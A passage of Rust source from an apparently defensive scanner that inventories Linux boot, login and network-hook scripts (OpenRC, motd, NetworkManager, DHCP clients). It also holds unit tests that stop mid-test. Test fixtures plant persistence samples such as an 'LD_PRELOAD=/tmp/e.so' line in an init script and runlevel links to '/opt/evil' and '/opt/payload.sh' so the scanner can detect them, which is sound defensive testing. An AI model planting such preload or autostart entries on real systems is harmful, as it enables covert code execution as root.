fn openrc_extras(cx: &mut Ctx, rc: &Openrc, scripts: &BTreeSet<Vec<u8>>, conf_d: BTreeSet<PathBuf>) -> Vec<Entry> {
    let mut out = Vec::new();
    let sourced = |cx: &mut Ctx, rel: &Path, name: String, by: &str| -> Entry {
        let mut e = cx.entry(Kind::OpenrcService, rel, name);
        e.trigger = Trigger::Boot;
        e.principal = Some(ROOT.to_string());
        e.target_path = Some(cx.root.abs(rel));
        e.enabled = Enablement::Enabled;
        e.note("sourced_by", by);
        e
    };
    for prefix in OPENRC_PREFIXES {
        let rel = PathBuf::from(prefix).join("rc.conf");
        if cx.root.stat_follow(&rel).is_ok_and(|m| m.is_file) {
            out.push(sourced(cx, &rel, "rc.conf".to_string(), "every service, before its conf.d"));
        }
        let dir = PathBuf::from(prefix).join("rc.conf.d");
        let names: Vec<_> = cx.dir(&dir).into_iter().filter(|e| !e.is_dir && e.name.as_bytes().ends_with(b".conf")).map(|e| e.name).collect();
        for name in names {
            let rel = dir.join(&name);
            out.push(sourced(cx, &rel, format!("rc.conf.d/{}", name.to_string_lossy()), "every service, before its conf.d"));
        }
    }
    for rel in conf_d {
        let stem = rel.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
        let by = format!("the service {} at every start", stem.split('.').next().unwrap_or(&stem));
        out.push(sourced(cx, &rel, format!("conf.d/{stem}"), &by));
    }

    // local.d sits beside the init.d that holds the local script.
    let local_levels = rc.runlevels_of("local");
    let local_prefix = OPENRC_PREFIXES.iter().find(|p| cx.root.stat_follow(format!("{p}/init.d/local")).is_ok_and(|m| m.is_file));
    for prefix in OPENRC_PREFIXES {
        let dir = PathBuf::from(prefix).join("local.d");
        let names: Vec<_> = cx.dir(&dir).into_iter().filter(|e| !e.is_dir).map(|e| e.name).collect();
        for name in names {
            let raw = name.as_bytes();
            let stops = raw.ends_with(b".stop");
            if !stops && !raw.ends_with(b".start") {
                continue;
            }
            let rel = dir.join(&name);
            let mut e = script_entry(cx, Kind::RcLocal, &rel, &name, if stops { Trigger::PowerEvent } else { Trigger::Boot });
            e.note("run_by", "OpenRC's local service, with eval");
            let exec = exec_mode(cx, &rel) != 0;
            e.note("executable", exec.to_string());
            e.enabled = Enablement::Disabled;
            if local_prefix != Some(&prefix) {
                e.note("not_run", "the local service reads the local.d beside its own init.d");
            } else if local_levels.is_empty() {
                e.note("not_run", "the local service is in no runlevel");
            } else if !exec {
                e.note("not_run", "the local service runs only executable files");
            } else {
                e.enabled = Enablement::Enabled;
                e.note("runlevels", local_levels.join(", "));
            }
            out.push(e);
        }
    }

    for (level, (services, _)) in &rc.levels {
        for name in services {
            if scripts.contains(name.as_bytes()) {
                continue;
            }
            let rel = Path::new(OPENRC_RUNLEVELS).join(level).join(name);
            let mut e = cx.entry(Kind::OpenrcService, &rel, format!("{level}/{name}"));
            e.trigger = Trigger::Boot;
            e.principal = Some(ROOT.to_string());
            e.enabled = Enablement::Disabled;
            e.note("runlevels", level.clone());
            e.note("not_run", format!("no init.d holds a script named {name}; rc reports a service that does not exist"));
            if let Ok(t) = cx.root.read_link(&rel) {
                e.note("link_target", t.display().to_string());
            }
            out.push(e);
        }
    }
    out
}

/// `### BEGIN INIT INFO` ... `### END INIT INFO`. Continuation lines — a bare
/// `#` followed by more dependencies — are dropped rather than merged; they
/// are rare and guessing at them would invent facts.
fn lsb_header(e: &mut Entry, bytes: &[u8]) {
    let mut inside = false;
    for line in bytes.split(|b| *b == b'\n').take(SCAN_LINES) {
        let t = line.strip_suffix(b"\r").unwrap_or(line).trim_ascii();
        if t.starts_with(b"###") && t.ends_with(b"BEGIN INIT INFO") {
            inside = true;
            continue;
        }
        if !inside {
            continue;
        }
        if t.ends_with(b"END INIT INFO") {
            break;
        }
        let Some(rest) = t.strip_prefix(b"#") else { continue };
        let Some(colon) = rest.iter().position(|b| *b == b':') else { continue };
        let key = String::from_utf8_lossy(rest[..colon].trim_ascii()).into_owned();
        if !matches!(key.as_str(), "Provides" | "Required-Start" | "Default-Start") {
            continue;
        }
        let value = String::from_utf8_lossy(&rest[colon + 1..]);
        e.note(&format!("lsb.{key}"), value.split_whitespace().collect::<Vec<_>>().join(" "));
    }
}

// ---------------------------------------------------------------- MOTD ----

/// update-motd.d is run by pam_motd at every login as `run-parts --lsbsysinit`
/// (its own strings say so): with debianutils' run-parts that is the LSB name
/// rule, not the plain one.
fn motd(cx: &mut Ctx, flavour: super::RunParts) -> Vec<Entry> {
    let flavour = if flavour == super::RunParts::Debian { super::RunParts::DebianLsb } else { flavour };
    let mut out = Vec::new();
    for f in super::run_parts_dir(cx, flavour, Path::new(MOTD_DIR)) {
        let mut e = script_entry(cx, Kind::Motd, &f.rel, &f.name, Trigger::Login);
        e.enabled = Enablement::Enabled;
        e.note("executable", (exec_mode(cx, &f.rel) != 0).to_string());
        if let Some(why) = f.not_run {
            e.enabled = Enablement::Disabled;
            e.note("not_run", why);
        }
        out.push(e);
    }
    out
}

// ------------------------------------------------- NetworkManager hooks ----

fn dispatcher(cx: &mut Ctx) -> Vec<Entry> {
    let mut candidates = Vec::new();
    for base in NM_DIRS {
        candidates.push(("dispatch".to_string(), PathBuf::from(*base)));
        for phase in NM_PHASES {
            candidates
                .push((phase.trim_end_matches(".d").to_string(), Path::new(base).join(phase)));
        }
    }

    let mut out = Vec::new();
    // A name in an earlier directory is the one NetworkManager runs, per phase.
    let mut first_of: BTreeSet<(String, Vec<u8>)> = BTreeSet::new();
    for (phase, _, dir) in cx.distinct_dirs(candidates) {
        for ent in cx.dir(&dir) {
            if ent.is_dir {
                continue;
            }
            let rel = dir.join(&ent.name);
            let mut e =
                script_entry(cx, Kind::NetworkDispatcher, &rel, &ent.name, Trigger::NetworkEvent);
            e.note("hook_phase", phase.clone());
            // NetworkManager checks S_IXUSR specifically, not any execute bit.
            let exec = exec_mode(cx, &rel) & 0o100 != 0;
            e.note("executable", exec.to_string());
            let mut refused = nm_refusal(cx, &rel);
            if let Some(why) = nm_name_refused(ent.name.as_bytes()) {
                refused.push(why);
            } else if !first_of.insert((phase.clone(), ent.name.as_bytes().to_vec())) {
                refused.push("a script of the same name in an earlier directory is run instead");
            }
            e.enabled = if exec && refused.is_empty() {
                Enablement::Enabled
            } else {
                Enablement::Disabled
            };
            if !refused.is_empty() {
                e.note("skipped_by_networkmanager", refused.join("; "));
            }
            out.push(e);
        }
    }
    out
}

/// The names nm-dispatcher passes over: a hidden file, an editor backup, and a
/// package manager's leftover copy. The suffixes are the ones in its binary.
fn nm_name_refused(name: &[u8]) -> Option<&'static str> {
    let backup = name.first() == Some(&b'.')
        || name.ends_with(b"~")
        || [&b".rpmsave"[..], b".rpmorig", b".rpmnew"].iter().any(|s| name.ends_with(s))
        || name.windows(6).any(|w| w == b".dpkg-");
    backup.then_some("a hidden, backup or package-manager copy")
}

/// NetworkManager refuses to run a dispatcher script it does not trust. These
/// are its own checks, from nm-dispatcher's check_permissions: a script that
/// fails one is present and inert, and reporting it as enabled would be a lie
/// in the operator's favour.
fn nm_refusal(cx: &Ctx, rel: &Path) -> Vec<&'static str> {
    let mut why = Vec::new();
    match cx.root.stat_follow(rel) {
        Ok(m) => {
            if !m.is_file {
                why.push("not a regular file");
            }
            if m.uid != 0 {
                why.push("not owned by root");
            }
            if m.mode & 0o022 != 0 {
                why.push("writable by group or other");
            }
        }
        Err(_) => why.push("does not resolve to a file"),
    }
    why
}

// -------------------------------------------------------------- shared ----

/// The shape every entry here shares: a script file, its head scanned for the
/// interpreter and the environment a later pass correlates.
fn script_entry(
    cx: &mut Ctx,
    kind: Kind,
    rel: &Path,
    name: &OsStr,
    trigger: Trigger,
) -> Entry {
    let mut e = cx.entry(kind, rel, name.to_string_lossy());
    name_from_os(&mut e, name);
    e.trigger = trigger;
    e.principal = Some(ROOT.to_string());
    // The file is the command; there is no argument vector to record.
    e.target_path = Some(cx.root.abs(rel));
    if cx.root.stat(rel).is_ok_and(|m| m.is_symlink) {
        e.note("is_symlink", "true");
    }
    script_facts(cx, &mut e, rel);
    e
}

fn script_facts(cx: &mut Ctx, e: &mut Entry, rel: &Path) {
    // Only a regular file is read; the root refuses the rest, and the scan
    // records a directory or FIFO as a limit rather than a failure (§7).
    let outcome = cx.read_outcome(rel, crate::root::READ_CAP);
    cx.record(rel, crate::root::READ_CAP, &outcome);
    let bytes = match outcome {
        Read::Bytes { bytes, .. } => bytes,
        Read::NotRegular => return e.note("not_a_regular_file", "true"),
        // Dangling, absent, refused or unreadable: cx.entry and the record
        // above have said so.
        _ => return,
    };
    e.note("head_scan", format!("first {SCAN_LINES} lines"));
    lsb_header(e, &bytes);

    let mut env: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for (n, line) in bytes.split(|b| *b == b'\n').take(SCAN_LINES).enumerate() {
        let line = line.strip_suffix(b"\r").unwrap_or(line);
        if n == 0 {
            shebang(e, line);
        }
        let Some((k, v)) = env_assignment(line) else { continue };
        if std::str::from_utf8(v).is_err() {
            e.flag(Flag::EncodingAnomaly);
        }
        let slot = env.entry(String::from_utf8_lossy(k).into_owned()).or_default();
        let value = String::from_utf8_lossy(v).into_owned();
        if !slot.contains(&value) {
            slot.push(value);
        }
    }
    for (k, v) in env {
        e.note(&format!("env.{k}"), v.join(", "));
    }
}

fn shebang(e: &mut Entry, line: &[u8]) {
    let Some(rest) = line.strip_prefix(b"#!") else { return };
    let rest = rest.trim_ascii();
    if rest.is_empty() {
        return;
    }
    if std::str::from_utf8(rest).is_err() {
        e.flag(Flag::EncodingAnomaly);
        e.note("shebang_hex", hex(rest));
    }
    let end = rest.iter().position(u8::is_ascii_whitespace).unwrap_or(rest.len());
    e.note("interpreter", String::from_utf8_lossy(&rest[..end]));
    e.note("shebang", String::from_utf8_lossy(rest));
}

/// A leading `NAME=value`, with or without `export`. The name test is what
/// keeps `if [ "$x" = y ]` and `test a=b` out: only a shell-legal identifier
/// standing at the head of the line is an assignment.
fn env_assignment(line: &[u8]) -> Option<(&[u8], &[u8])> {
    let t = line.trim_ascii_start();
    if matches!(t.first(), None | Some(b'#')) {
        return None;
    }
    let t = match t.strip_prefix(b"export ") {
        Some(r) => r.trim_ascii_start(),
        None => t,
    };
    let eq = t.iter().position(|b| *b == b'=')?;
    let name = &t[..eq];
    if name.is_empty() || !(name[0].is_ascii_alphabetic() || name[0] == b'_') {
        return None;
    }
    if !name.iter().all(|b| b.is_ascii_alphanumeric() || *b == b'_') {
        return None;
    }
    let rest = &t[eq + 1..];
    let value = match rest.first() {
        Some(q @ (b'"' | b'\'')) => {
            let end = rest[1..].iter().position(|b| b == q).map_or(rest.len(), |i| i + 1);
            &rest[1..end]
        }
        _ => {
            let end = rest
                .iter()
                .position(|b| b.is_ascii_whitespace() || *b == b';')
                .unwrap_or(rest.len());
            &rest[..end]
        }
    };
    Some((name, value))
}

// ------------------------------------------------------------- DHCP hooks ----

const DHCLIENT_SCRIPTS: [&str; 2] = ["sbin/dhclient-script", "usr/sbin/dhclient-script"];
const DHCPCD_RUN_HOOKS: [&str; 3] =
    ["usr/lib/dhcpcd/dhcpcd-run-hooks", "lib/dhcpcd/dhcpcd-run-hooks", "usr/libexec/dhcpcd-run-hooks"];
const DHCLIENT_ETC: &str = "etc/dhcp";
const SCRIPT_CAP: usize = 256 * 1024;

/// A DHCP client hook: a file the client's script sources, as root, on every
/// lease event. Sourced, not executed, so its execute bit does not decide
/// whether it runs; the script's own rule does.
fn dhcp_hook(cx: &mut Ctx, rel: &Path, client: &str, phase: &str, not_run: Option<String>) -> Entry {
    let name = rel.file_name().unwrap_or_default().to_os_string();
    let mut e = script_entry(cx, Kind::NetworkDispatcher, rel, &name, Trigger::NetworkEvent);
    e.note("dispatcher", client);
    e.note("hook_phase", phase);
    e.enabled = if not_run.is_none() { Enablement::Enabled } else { Enablement::Disabled };
    if let Some(why) = not_run {
        e.note("not_run", why);
    }
    e
}

/// dhclient runs its hooks from dhclient-script, and the two script lines
/// on the supported set choose them differently, so the host's own script
/// is read to see which it is. Debian's sources /etc/dhcp/dhclient-enter-hooks
/// and -exit-hooks, then what `run-parts --list` selects in the matching .d
/// directories: names of letters, digits, `_` and `-` only, whatever their
/// mode. Fedora's sources the same two files, then whatever
/// `find DIR -executable ! -empty` returns in the .d directories, at any
/// depth and under any name; and also dhclient-up-hooks when executable, and
/// each executable dhclient.d/*.sh.
fn dhclient_hooks(cx: &mut Ctx) -> Vec<Entry> {
    let Some(script) = DHCLIENT_SCRIPTS.iter().find(|p| cx.root.exists(p)) else { return Vec::new() };
    let Some(text) = cx.read_capped(script, SCRIPT_CAP) else { return Vec::new() };
    let has = |needle: &[u8]| text.windows(needle.len()).any(|w| w == needle);
    let run_parts = has(b"run-parts --list");
    let find = has(b"-executable ! -empty");
    let etc = Path::new(DHCLIENT_ETC);
    let mut out = Vec::new();

    for phase in ["enter", "exit"] {
        let file = etc.join(format!("dhclient-{phase}-hooks"));
        if cx.root.stat_follow(&file).is_ok_and(|m| m.is_file) {
            out.push(dhcp_hook(cx, &file, "dhclient", phase, None));
        }
        let dir = etc.join(format!("dhclient-{phase}-hooks.d"));
        let mut files = Vec::new();
        walk_files(cx, &dir, find, &mut files);
        files.sort();
        for rel in files {
            let name = rel.file_name().unwrap_or_default().as_bytes().to_vec();
            let why = if run_parts {
                let ok = !name.is_empty() && name.iter().all(|b| b.is_ascii_alphanumeric() || *b == b'_' || *b == b'-');
                (!ok).then(|| "run-parts --list skips a name with other characters".to_string())
            } else if find {
                let empty = cx.root.stat_follow(&rel).is_ok_and(|m| m.size == 0);
                let exec = exec_mode(cx, &rel) != 0;
                (!(exec && !empty)).then(|| "dhclient-script runs only executable, non-empty files".to_string())
            } else {
                // A script this reader does not recognise: shown as running.
                None
            };
            out.push(dhcp_hook(cx, &rel, "dhclient", phase, why));
        }
    }
    if find {
        let up = etc.join("dhclient-up-hooks");
        if cx.root.stat_follow(&up).is_ok_and(|m| m.is_file) {
            let exec = exec_mode(cx, &up) != 0;
            out.push(dhcp_hook(cx, &up, "dhclient", "up", (!exec).then(|| "not executable".to_string())));
        }
        let dir = etc.join("dhclient.d");
        let mut files: Vec<PathBuf> = cx
            .dir(&dir)
            .into_iter()
            .filter(|e| !e.is_dir && e.name.as_bytes().ends_with(b".sh"))
            .map(|e| dir.join(e.name))
            .collect();
        files.sort();
        for rel in files {
            let exec = exec_mode(cx, &rel) != 0;
            out.push(dhcp_hook(cx, &rel, "dhclient", "config", (!exec).then(|| "not executable".to_string())));
        }
    }
    out
}

/// Every file under `dir`, and under its subdirectories when `deep`: what
/// `find` walks. Subdirectories are not followed through links.
fn walk_files(cx: &mut Ctx, dir: &Path, deep: bool, out: &mut Vec<PathBuf>) {
    for ent in cx.dir(dir) {
        let rel = dir.join(&ent.name);
        if ent.is_dir {
            if deep {
                walk_files(cx, &rel, deep, out);
            }
        } else {
            out.push(rel);
        }
    }
}

/// dhcpcd-run-hooks sources the files its `for hook in` list names, in
/// order: /etc/dhcpcd.enter-hook, every file in the hooks directory it was
/// built with, /etc/dhcpcd.exit-hook. The list is read from the host's own
/// script, so the directory is wherever that distribution put it. A name
/// ending in `~` is skipped, as is one `nohook` in dhcpcd.conf names: the
/// name itself, or with a two-digit prefix, optionally ending in .sh.
fn dhcpcd_hooks(cx: &mut Ctx) -> Vec<Entry> {
    let Some(script) = DHCPCD_RUN_HOOKS.iter().find(|p| cx.root.exists(p)) else { return Vec::new() };
    let Some(text) = cx.read_capped(script, SCRIPT_CAP) else { return Vec::new() };
    let text = String::from_utf8_lossy(&text);
    let mut patterns = Vec::new();
    let mut lines = text.lines().skip_while(|l| l.trim() != "for hook in \\");
    lines.next();
    for line in lines {
        let word = line.trim().trim_end_matches('\\').trim();
        if word.is_empty() || word == "do" {
            break;
        }
        patterns.push(word.to_string());
        if !line.trim_end().ends_with('\\') {
            break;
        }
    }
    let (global, scoped) = nohooks(cx);
    let skipped_by = |name: &str, list: &[String]| {
        list.iter().any(|h| {
            let prefixed = name.len() > 3 && name.as_bytes()[..2].iter().all(u8::is_ascii_digit) && name.as_bytes()[2] == b'-';
            let rest = if prefixed { &name[3..] } else { "" };
            name == h || rest == h || rest == format!("{h}.sh")
        })
    };

    let mut out = Vec::new();
    for pat in patterns {
        let rel = PathBuf::from(pat.trim_start_matches('/'));
        let files: Vec<PathBuf> = if pat.ends_with("/*") {
            let dir = rel.parent().unwrap_or(Path::new("")).to_path_buf();
            let mut f: Vec<PathBuf> = cx
                .dir(&dir)
                .into_iter()
                .filter(|e| !e.is_dir && !e.name.as_bytes().starts_with(b"."))
                .map(|e| dir.join(e.name))
                .collect();
            f.sort();
            f
        } else {
            vec![rel]
        };
        for rel in files {
            if !cx.root.stat_follow(&rel).is_ok_and(|m| m.is_file) {
                continue;
            }
            let name = rel.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
            let phase = if pat.contains("enter-hook") { "enter" } else if pat.contains("exit-hook") { "exit" } else { "hooks" };
            let why = if name.ends_with('~') {
                Some("dhcpcd-run-hooks skips a name ending in ~".to_string())
            } else if skipped_by(&name, &global) {
                Some("nohook in dhcpcd.conf".to_string())
            } else {
                None
            };
            let runs = why.is_none();
            let mut e = dhcp_hook(cx, &rel, "dhcpcd", phase, why);
            if runs && skipped_by(&name, &scoped) {
                e.note("nohook_for_some_interfaces", "true");
            }
            out.push(e);
        }
    }
    out
}

/// `nohook` names from dhcpcd.conf: those before the first `interface` or
/// `ssid` block apply everywhere, the rest only to their block.
fn nohooks(cx: &mut Ctx) -> (Vec<String>, Vec<String>) {
    let (mut global, mut scoped) = (Vec::new(), Vec::new());
    let Some(bytes) = cx.read_capped("etc/dhcpcd.conf", SCRIPT_CAP) else { return (global, scoped) };
    let mut in_block = false;
    for line in String::from_utf8_lossy(&bytes).lines() {
        let line = line.split('#').next().unwrap_or_default().trim();
        let mut words = line.split_whitespace();
        match words.next() {
            Some("interface" | "ssid" | "profile") => in_block = true,
            Some("nohook") => {
                let names = words.flat_map(|w| w.split(',')).filter(|w| !w.is_empty()).map(String::from);
                if in_block { scoped.extend(names) } else { global.extend(names) }
            }
            _ => {}
        }
    }
    (global, scoped)
}

fn exec_mode(cx: &Ctx, rel: &Path) -> u32 {
    cx.root.stat_follow(rel).map_or(0, |m| if m.is_file { m.mode & 0o111 } else { 0 })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::root::Root;
    use crate::scan::{Options, Scan, Status, run};
    use std::fs;
    use std::os::unix::fs::PermissionsExt;

    fn tree(tag: &str) -> crate::testing::Tree {
        let p = crate::testing::Tree::new(&format!("init-{tag}"));
        p
    }

    fn put(root: &Path, rel: &str, bytes: &[u8], mode: u32) {
        let p = root.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(&p, bytes).unwrap();
        fs::set_permissions(&p, PermissionsExt::from_mode(mode)).unwrap();
    }

    fn link(root: &Path, target: &str, at: &str) {
        let p = root.join(at);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(target, p).unwrap();
    }

    fn scan(dir: &Path) -> Scan {
        let root = Root::at(dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(InitScripts)];
        run(&root, &Options { deep: false }, &collectors)
    }

    fn status(s: &Scan) -> &Status {
        &s.header.collectors.iter().find(|c| c.name == "initscripts").unwrap().status
    }

    fn of_kind(s: &Scan, kind: Kind) -> Vec<&Entry> {
        s.entries.iter().filter(|e| e.kind == kind).collect()
    }

    fn one<'a>(s: &'a Scan, kind: Kind, name: &str) -> &'a Entry {
        let found: Vec<&Entry> =
            s.entries.iter().filter(|e| e.kind == kind && e.name == name).collect();
        assert_eq!(found.len(), 1, "expected one {kind} named {name}, got {}", found.len());
        found[0]
    }

    const SSH: &[u8] = b"#!/bin/sh\n\
### BEGIN INIT INFO\n\
# Provides:          sshd ssh\n\
# Required-Start:    $remote_fs $syslog\n\
# Default-Start:     2 3 4 5\n\
# Default-Stop:      0 1 6\n\
# Short-Description: OpenBSD Secure Shell server\n\
### END INIT INFO\n\
LD_PRELOAD=/tmp/e.so\n\
export PATH=\"/usr/sbin:/usr/bin\"\n\
if [ \"$x\" = y ]; then :; fi\n\
test a=b\n\
exec /usr/sbin/sshd\n";

    #[test]
    fn presence_in_init_d_is_not_enablement() {
        let dir = tree("sysv");
        put(&dir, "etc/init.d/ssh", SSH, 0o755);
        put(&dir, "etc/init.d/dormant", b"#!/bin/bash\n", 0o755);
        put(&dir, "etc/init.d/.depend.boot", b"TARGETS = x\n", 0o644);
        link(&dir, "../init.d/ssh", "etc/rc2.d/S01ssh");
        link(&dir, "../init.d/ssh", "etc/rc3.d/S01ssh");
        link(&dir, "../init.d/ssh", "etc/rc0.d/K02ssh");
        link(&dir, "../init.d/dormant", "etc/rc6.d/K09dormant");

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));

        let ssh = one(&s, Kind::SysvInit, "ssh");
        assert_eq!(ssh.enabled, Enablement::Enabled, "an S link in any rc?.d enables it");
        assert_eq!(ssh.raw["start_runlevels"], "2, 3");
        assert_eq!(ssh.raw["stop_runlevels"], "0");
        assert_eq!(ssh.raw["start_priority"], "01");
        assert_eq!(ssh.trigger, Trigger::Boot);
        assert_eq!(ssh.principal.as_deref(), Some("root"));
        assert_eq!(ssh.command, None);
        assert_eq!(ssh.target_path, Some(dir.join("etc/init.d/ssh")));

        assert_eq!(ssh.raw["lsb.Provides"], "sshd ssh");
        assert_eq!(ssh.raw["lsb.Required-Start"], "$remote_fs $syslog");
        assert_eq!(ssh.raw["lsb.Default-Start"], "2 3 4 5");
        assert!(!ssh.raw.contains_key("lsb.Short-Description"));

        assert_eq!(ssh.raw["interpreter"], "/bin/sh");
        assert_eq!(ssh.raw["env.LD_PRELOAD"], "/tmp/e.so", "a preload hides in a plain assignment");
        assert_eq!(ssh.raw["env.PATH"], "/usr/sbin:/usr/bin");
        assert!(!ssh.raw.keys().any(|k| k.starts_with("env.test")), "`test a=b` is not an assignment");
        assert_eq!(ssh.raw["head_scan"], "first 200 lines");

        // Default-Start says 2 3 4 5; only links decide, and there are none.
        let dormant = one(&s, Kind::SysvInit, "dormant");
        assert_eq!(dormant.enabled, Enablement::Disabled);
        assert!(!dormant.raw.contains_key("start_runlevels"));
        assert_eq!(dormant.raw["stop_runlevels"], "6");

        assert!(
            !s.entries.iter().any(|e| e.name == ".depend.boot"),
            "insserv's cache is not a script"
        );
        assert_eq!(of_kind(&s, Kind::SysvInit).len(), 2, "one entry per script, links folded in");
        fs::remove_dir_all(&dir).unwrap();
    }

    const OPENRC_SSHD: &[u8] = b"#!/sbin/openrc-run\ncommand=/usr/sbin/sshd\n";

    /// An OpenRC host: openrc-run installed and BusyBox as PID 1.
    fn openrc_host(dir: &Path) {
        put(dir, "sbin/openrc-run", b"\x7fELF openrc-run", 0o755);
        put(dir, "bin/busybox", b"\x7fELF BusyBox /etc/inittab", 0o755);
        link(dir, "/bin/busybox", "sbin/init");
        put(dir, "etc/inittab", b"::sysinit:/sbin/openrc sysinit\n::sysinit:/sbin/openrc boot\n::wait:/sbin/openrc default\n::shutdown:/sbin/openrc shutdown\n", 0o644);
    }

    #[test]
    fn openrc_starts_what_a_runlevel_names_and_reads_nothing_from_rc_d() {
        let dir = tree("openrc");
        openrc_host(&dir);
        for svc in ["sshd", "crond", "local", "dormant", "net.eth0", "later", "nonet-only"] {
            put(&dir, &format!("etc/init.d/{svc}"), OPENRC_SSHD, 0o755);
        }
        put(&dir, "etc/init.d/functions.sh", b"# helpers\n", 0o644);
        put(&dir, "usr/local/etc/init.d/sshd", b"#!/sbin/openrc-run\ncommand=/opt/sshd\n", 0o755);
        for d in ["sysinit", "boot", "default", "nonetwork", "shutdown"] {
            fs::create_dir_all(dir.join("etc/runlevels").join(d)).unwrap();
        }
        link(&dir, "/etc/init.d/sshd", "etc/runlevels/default/sshd");
        // A plain file, a dangling link and a .sh name: only the first counts.
        put(&dir, "etc/runlevels/default/crond", b"", 0o644);
        link(&dir, "/etc/init.d/gone", "etc/runlevels/default/gone");
        link(&dir, "/etc/init.d/functions.sh", "etc/runlevels/default/functions.sh");
        // A name with no script behind it starts nothing, and is a row; the
        // link's target only matters in that a dangling one is not listed.
        put(&dir, "opt/evil", b"#!/bin/sh\n", 0o755);
        link(&dir, "/opt/evil", "etc/runlevels/default/evil");
        put(&dir, "etc/runlevels/default/ghost", b"", 0o644);
        // A directory that names no runlevel is a name in it all the same.
        fs::create_dir_all(dir.join("etc/runlevels/default/adir")).unwrap();
        // nonetwork stacks default; later is only in nonetwork.
        link(&dir, "../default", "etc/runlevels/nonetwork/default");
        link(&dir, "/etc/init.d/later", "etc/runlevels/nonetwork/later");
        link(&dir, "/etc/init.d/nonet-only", "etc/runlevels/nonetwork/nonet-only");
        link(&dir, "/etc/init.d/net.eth0", "etc/runlevels/boot/net.eth0");
        link(&dir, "/etc/init.d/local", "etc/runlevels/default/local");
        // An rc?.d link, which OpenRC never reads.
        link(&dir, "../init.d/dormant", "etc/rc2.d/S20dormant");
        link(&dir, "/opt/payload.sh", "etc/rc3.d/S99payload");
        // conf.d, with a per-runlevel variant and the net stem.
        put(&dir, "etc/conf.d/sshd", b"SSHD_OPTS=\n", 0o644);
        put(&dir, "etc/conf.d/sshd.nonetwork", b"SSHD_OPTS=-x\n", 0o644);
        put(&dir, "etc/conf.d/net", b"config_eth0=dhcp\n", 0o644);
        put(&dir, "usr/local/etc/conf.d/sshd", b"SSHD_OPTS=-y\n", 0o644);
        put(&dir, "etc/rc.conf", b"rc_parallel=NO\n", 0o644);
        put(&dir, "etc/rc.conf.d/site.conf", b"rc_logger=YES\n", 0o644);
        put(&dir, "etc/rc.conf.d/notes.txt", b"x\n", 0o644);
        // local.d: executable, not executable, a stop file, a stray.
        put(&dir, "etc/local.d/10-agent.start", b"#!/bin/sh\n/opt/agent &\n", 0o755);
        put(&dir, "etc/local.d/20-quiet.start", b"#!/bin/sh\n/opt/quiet\n", 0o644);
        put(&dir, "etc/local.d/90-bye.stop", b"#!/bin/sh\n/opt/bye\n", 0o755);
        put(&dir, "etc/local.d/README", b"docs\n", 0o644);

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));
        assert!(of_kind(&s, Kind::SysvInit).iter().all(|e| e.raw.contains_key("runlevel")), "init.d scripts are OpenRC services here");

        // Two scripts of one name: the /usr/local/etc one is found first and
        // is the service; the /etc one is a row that says it is shadowed.
        let sshds: Vec<&Entry> = of_kind(&s, Kind::OpenrcService).into_iter().filter(|e| e.name == "sshd").collect();
        assert_eq!(sshds.len(), 2);
        let sshd = sshds.iter().find(|e| e.source.starts_with(dir.join("usr/local"))).unwrap();
        let shadowed = sshds.iter().find(|e| e.source.starts_with(dir.join("etc"))).unwrap();
        assert_eq!((sshd.enabled, sshd.raw["runlevels"].as_str(), sshd.raw["starts_at_boot"].as_str()), (Enablement::Enabled, "default, nonetwork", "true"));
        assert!(!sshd.raw.contains_key("shadowed_by"));
        assert_eq!((shadowed.enabled, shadowed.raw["shadowed_by"].as_str()), (Enablement::Disabled, "a script of the same name in an earlier init.d"));
        assert_eq!(sshd.raw["interpreter"], "/sbin/openrc-run");
        let confs = sshd.raw["conf_d"].clone();
        for f in ["etc/conf.d/sshd", "etc/conf.d/sshd.nonetwork", "usr/local/etc/conf.d/sshd"] {
            assert!(confs.contains(&dir.join(f).display().to_string()), "{f} in {confs}");
        }
        let crond = one(&s, Kind::OpenrcService, "crond");
        assert_eq!(crond.enabled, Enablement::Enabled, "any entry of the name counts, a plain file included");
        assert_eq!(one(&s, Kind::OpenrcService, "dormant").enabled, Enablement::Disabled, "an rc2.d link enables nothing");
        assert_eq!(one(&s, Kind::OpenrcService, "dormant").raw["start_runlevels"], "2");
        let later = one(&s, Kind::OpenrcService, "later");
        assert_eq!((later.raw["runlevels"].as_str(), later.raw["starts_at_boot"].as_str()), ("nonetwork", "false"));
        let net = one(&s, Kind::OpenrcService, "net.eth0");
        assert!(net.raw["conf_d"].contains("etc/conf.d/net"), "net.eth0 sources conf.d/net: {}", net.raw["conf_d"]);
        assert_eq!(one(&s, Kind::OpenrcService, "functions.sh").raw["not_run"], ".sh files are not init scripts to OpenRC");
        let payload = one(&s, Kind::SysvInit, "S99payload");
        assert_eq!(payload.enabled, Enablement::Disabled);
        assert_eq!(payload.raw["not_run"], "OpenRC reads /etc/runlevels, not rc?.d");

        let names: Vec<&str> = of_kind(&s, Kind::OpenrcService).iter().map(|e| e.name.as_str()).collect();
        assert!(!names.contains(&"default/gone"), "a dangling entry is not there to OpenRC: {names:?}");
        assert!(!names.contains(&"default/functions.sh"));
        let evil = one(&s, Kind::OpenrcService, "default/evil");
        assert_eq!((evil.enabled, evil.raw["link_target"].as_str()), (Enablement::Disabled, "/opt/evil"));
        assert!(evil.raw["not_run"].starts_with("no init.d holds a script named evil"));
        assert!(names.contains(&"default/ghost"));
        assert!(names.contains(&"default/adir"), "OpenRC lists a directory in a runlevel: {names:?}");

        assert_eq!(one(&s, Kind::OpenrcService, "rc.conf").raw["sourced_by"], "every service, before its conf.d");
        assert!(names.contains(&"rc.conf.d/site.conf"));
        assert!(!names.contains(&"rc.conf.d/notes.txt"));
        let conf = one(&s, Kind::OpenrcService, "conf.d/sshd.nonetwork");
        assert_eq!(conf.raw["sourced_by"], "the service sshd at every start");
        assert_eq!(conf.target_path, Some(dir.join("etc/conf.d/sshd.nonetwork")));
        assert_eq!(names.iter().filter(|n| **n == "conf.d/net").count(), 1, "one entry however many services source it");

        let agent = one(&s, Kind::RcLocal, "10-agent.start");
